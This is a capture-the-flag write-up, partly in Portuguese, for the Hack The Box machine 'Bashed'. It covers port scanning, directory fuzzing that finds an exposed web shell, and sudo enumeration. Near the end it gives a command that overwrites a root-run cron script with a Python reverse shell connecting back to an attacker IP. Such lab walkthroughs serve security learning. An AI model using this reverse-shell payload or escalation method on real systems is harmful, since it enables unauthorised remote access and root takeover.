# Bashed-----HTB


└─$ nmap bashed.htb                         
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 16:08 -0300
Nmap scan report for bashed.htb (10.129.4.101)
Host is up (0.17s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds



Only port eighty. Reveals a website:
<img width="1919" height="784" alt="image" src="https://github.com/user-attachments/assets/e3877c13-3b3a-4897-9ed1-e1fc86e0cd8a" />

Let's ffufing the website we find the /dev folder using the following command
ffuf -w ../../SecLists/Discovery/Web-Content/quickhits.txt -u http://bashed.htb/FUZZ
We can find the dev folder:
<img width="794" height="155" alt="image" src="https://github.com/user-attachments/assets/7ced6a12-3020-412b-9d65-eeb6ee3bb30d" />

Inside we find phpbash.php
<img width="1230" height="479" alt="image" src="https://github.com/user-attachments/assets/b883feef-0a72-4fd1-ac6c-ec2306fa1a97" />

Go to /home/arrexel and cat the user
<img width="961" height="762" alt="image" src="https://github.com/user-attachments/assets/9e2b509d-185b-4d49-9e82-1df9e3dc345f" />

nw sudo -l to see that we can execute commands as scriptmanager freely:
<img width="1061" height="117" alt="image" src="https://github.com/user-attachments/assets/4dcce543-0f8d-47de-a495-e78e0caadbfc" />

Now we look for files and folders that belong to scriptmanager
sudo -u scriptmanager find / -user scriptmanager -ls 2>/dev/null
<img width="946" height="195" alt="image" src="https://github.com/user-attachments/assets/bc599793-4d19-4263-ba82-6e40e2738784" />

Relevant output is test.py again for being the non defult option that stands out the most, custom files are generally ver unsafe:
<img width="996" height="202" alt="image" src="https://github.com/user-attachments/assets/ba5178d2-0e31-49c0-8f5b-305be292b959" />

test.py createsa file called test.txt:
<img width="771" height="77" alt="image" src="https://github.com/user-attachments/assets/fbbf8590-402e-4624-ae99-cafde2d944d8" />

test.txt pertence a rott, isto quer dize que test.py é executado por root que cria um arquivo test.txt
<img width="663" height="98" alt="image" src="https://github.com/user-attachments/assets/51bf89de-fbbf-4d32-b644-fe4d9e96eb72" />

O arquivo test.py é executado periodocamente pelo sistema criando o arquivo test.txt. Qualquer coisa que for criada pelo usuário que executa um arquivo terá as permissões da pessoa que executou, sendo assim, test.txt tem permissões de root. Vamos modificar o test.py, para que nos mande um reverse shell
sudo -u scriptmanager bash -c 'rm /scripts/test.py 2>/dev/null; echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.83\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])" > /scripts/test.py'

abrir um nc listener a nossa maquina:
<img width="458" height="32" alt="image" src="https://github.com/user-attachments/assets/b9fc929e-732a-48cf-8039-d5964f6b16b6" />

e receber root:
<img width="962" height="161" alt="image" src="https://github.com/user-attachments/assets/18aa8819-d6ff-47cd-966a-ee5d106bfe0b" />









